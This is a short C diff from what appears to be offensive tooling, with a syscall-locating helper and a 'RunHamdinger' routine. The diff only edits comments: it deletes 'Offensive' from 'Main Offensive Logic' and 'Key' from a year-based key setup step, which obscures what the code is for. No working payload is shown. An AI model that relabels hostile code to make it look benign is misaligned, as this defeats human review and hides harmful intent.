@@ -42,9 +42,9 @@ PVOID FindSyscallInstruction(PVOID funcAddr) {
     return NULL;
 }
 
-// --- Main Offensive Logic ---
+// --- Main Logic ---
 void RunHamdinger() {
-    // 1. Setup Key (Year-based)
+    // 1. Setup (Year-based)
     SYSTEMTIME st;
     char yack_face[MAX_KEY_LEN];
     char bear_str[5];
